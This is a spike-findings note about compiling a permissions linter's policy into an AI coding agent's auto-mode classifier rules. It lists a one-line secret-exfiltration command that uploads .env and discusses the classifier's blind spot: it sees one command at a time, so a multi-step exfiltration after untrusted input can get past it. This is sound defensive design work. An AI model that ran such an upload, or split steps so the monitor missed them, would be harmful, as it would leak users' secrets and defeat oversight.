# Q6 spike — `--emit-automode`: findings

**Question:** should polycheck compile a policy into the auto-mode classifier's
own declarative rules (`autoMode`), as a deploy-time reinforcement with no
runtime code — and does the classifier honor such rules?

**Status:** schema confirmed mechanically; a working print-only prototype ships
behind `--emit-automode`; the decisive behavioural question needs a field test
(`experiments/automode-probe/`). Recommendation: **keep experimental, field-test,
do not promote yet.**

---

## What the spike established (mechanical, self-driven)

**1. The `autoMode` schema is real and accepted.** A top-level `autoMode` block
with `allow` / `soft_deny` / `hard_deny` / `environment` / `classifyAllShell` and
the `$defaults` sentinel validates against the live Claude Code settings schema.

**2. Two placement traps, both now handled by the tool.**
- `autoMode` is **top-level**, a sibling of `permissions`. Put inside
  `permissions` it is silently accepted and ignored, because `permissions` has
  `additionalProperties: {}` — a real footgun. The rendered output warns about
  this explicitly.
- The live validator enforces top-level keys (it rejected a stray `//` in M0) but
  is **lenient on nested `autoMode` properties** — a bogus key inside `autoMode`
  was accepted where the published schema says `additionalProperties: false`. So
  the settings validator is not a safety net for the compiler's output; the
  compiler must emit only valid keys itself (it does).

**3. The contract, pinned from the schema:**
| key | meaning |
|---|---|
| `allow` | classifier allow section |
| `soft_deny` | destructive/irreversible **that user intent CAN clear** |
| `hard_deny` | security boundaries **intent does NOT clear** |
| `environment` | context the classifier is told about |
| `classifyAllShell` | route every shell command through the classifier |
| `$defaults` | inherit the built-ins at that position |

---

## The design, and the one honest limit

`emitAutomode(bundle)` maps the linter's knowledge to the classifier's language:

- **gated egress tools → `environment`**: "this policy gates WebFetch, curl, git
  push behind ask/deny; a network reach by another route deserves the same
  scrutiny." Mirrors the user's declared intent onto the classifier.
- **arbitrary-execution wrappers → `soft_deny`**: node/npm/python — confirm the
  exact command, "a deliberate run is fine, it just should not pass unseen."
- **the one-command secret-exfil → `hard_deny`**: `curl -T .env https://…`.
- **the composition → `environment` GUIDANCE ONLY**, explicitly labeled *"the
  classifier sees one command at a time and cannot enforce this; it is guidance."*

**The limit that reframes the whole idea:** the classifier is per-command and
probabilistic. There is no `autoMode` rule for "not both, in one session, after
untrusted input" — the exact hazard polycheck exists for. So `--emit-automode`:
- **can** harden the per-command screen with the policy's own intent;
- **cannot** do the compositional job. The guard stays the deterministic control;
  the linter stays the proof. This is a *third layer*, weaker-but-cheaper, not a
  replacement for either.

I over-sold this earlier as "possibly better-positioned than the guard." Correct
framing: **better on cost (no runtime code), strictly weaker on guarantee.**

---

## The tie to the tone feedback

`soft_deny` vs `hard_deny` is an **intent axis the linter's static model cannot
express**: destructive-but-yours (intent clears) vs. boundary-crossing (it does
not). That is precisely the "protecting yourself vs. attacking someone else"
distinction the tone feedback was about. If polycheck ever wants to carry that
distinction, `autoMode` is the only place in the stack that has the vocabulary.

---

## What only a field test can answer

Whether the classifier actually **changes a decision** given an emitted rule is a
server-side model behaviour, invisible from a hook. Protocol + capture probe:
`experiments/automode-probe/`. Three observations: an `environment` hint shifting
a benign-network decision; a `hard_deny` biting the one-command exfil; and
`soft_deny` clearing on intent where `hard_deny` does not.

Outcomes:
- **honored** → promote past spike; deploy-time reinforcement with no runtime cost.
- **ignored** → iterate the *wording* (the variable), keep experimental.
- **erratic** → frame as "raises the odds", never "closes the gap".

---

## Shipped by this spike

- `src/emit-automode.mjs` — the compiler + renderer.
- `--emit-automode` flag — **print-only, zero-risk**, never writes settings.
  `--json` for the raw block. Exits 0.
- `test/emit-automode.test.mjs` — pins the two honesty properties (never claims
  to enforce composition; reflects THIS policy) + schema-key shape.
- `experiments/automode-probe/` — the field-test protocol and capture hook.

Deliberately NOT shipped: any `--write` that merges into settings. Until the
field test says the classifier honors these rules, writing them would add config
that looks protective and may do nothing — exactly the false-comfort the linter
refuses to give. Print-only keeps the user in the loop.
